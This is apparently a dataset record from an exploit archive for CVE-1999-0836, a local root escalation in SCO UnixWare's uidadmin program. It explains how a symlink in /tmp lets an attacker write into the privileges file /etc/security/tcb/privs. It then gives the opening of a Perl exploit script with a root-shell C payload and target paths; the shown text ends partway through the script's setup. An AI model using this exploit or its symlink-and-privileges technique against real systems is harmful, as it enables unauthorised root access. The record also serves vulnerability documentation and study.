{
    "text": "ecve : CVE-1999-0836 ， title : SCO Unixware 7.0/7.0.1/7.1/7.1.1 - 'uidadmin' Local Privilege Escalation - SCO local Exploit ， verified : Verified ， exploit_detail : source :  ， Certain versions of SCO Unixware ship with an exploitable version of the /usr/bin/uidadmin program. The problem lies in that 'uidadmin' runs with root privileges and performs insecure writes to a scratch directory ( /tmp/ in this instance ) . A malicious user may overwrite any existing file on the system with their own data provided the files do not already exist , or they may overwrite existing files with a single string. ， This symlink attack is not typical due to specific features within the Unixware OS. The following excerpt is from a the discoverer of this bug , Brock Tellier. The message in it's entirety is referenced in the 'Credit' section of this vulnerability entry. ， \" UnixWare's system privileges are assigned two-fold. First , it has the standard UNIX suid/sgid conventions. Second , it has a list of programs and the additional privileges they gain when run in /etc/security/tcb/privs. ， For instance , /usr/bin/ping is * not * suid/sgid but may still perform raw socket operations because it gains the \"driver\" privilege in the privs file. Even ln , cp , mkdir and so on must have filesystem modification privileges in this file in order to perform their respective functions. ， A program which has \"allprivs\" defined in /etc/security/tcb/privs may perform any operation as though this program was suid-root. If we are able to overflow a buffer , for instance , in one of these allprivs programs , we could run shellcode normally , but only after we've set our uid to 0. Similarly if we overflowed ping , we could do all the socket operations we want , but we could NOT gain root access. ， The uidadmin program does not have allprivs defined , so we cannot just cut to the setreuid ( 0 , 0 ) chase and execute our shell. uidadmin does , however , have the dacwrite privilege and can therefore override all of the normal UNIX DAC ( Discretionary Access Control ) security precautions ( including filemode bits ) . ， Because of the way uidadmin opens \"uidata.tmp\" , we can only either create a file with any contents we desire anywhere on the system ( as long as it doesn't exist ) or overwrite an existing file with our string.\" ，  #  ! /usr/bin/perl ，  # /usr/bin/uidadmin exploit for UnixWare 7.1 ，  # Uses a symlink exploit to add our program to a list of elevated privile= ， ges ，  # programs in /etc/security/tcb/privs. After reboot , /tmp/ui will be add= ， ed ，  # to the list of privileged programs. ，  # Format of the privs file is as follows ( ctime and size are just as ，  # st_ctime and st_size as described by stat ( 2 )  )  :  ，  # size : checksum : time : perms : /full/path/to/prog ，  # -Brock Tellier btellier @ usa.net ，  $ ui_source = \"/home/xnec/ui.c\" ;  ，  $ ui_dest = \"/home/xnec/ui\" ;  ，  $ ui_code = \"void main (  ) { setreuid ( 0 , 0 )  ; system ( \\\"/bin/ksh\\\" )  ; }\" ;  ，  $ privloc = \"/etc/security/tcb/privs\" ;  ，  $ uidatafile=\"/tmp/uidata\" ;  ，  $ sumpath = \"/usr/bin/sum\" ;  ，  $ uidata_sym = \"/tmp/uidata.tmp\" ;  ，  $ compiler = \"cc\" ;  ，  $ uidadmin = \"/usr/bin/uidadmin\" ;  ，  # Path to the directory where your $ uidata_sym will exist relative to ，  # /etc/uidata/ ，  $ uidadminarg = \"../../tmp\" ; ",
    "time": "1998-12-02"
}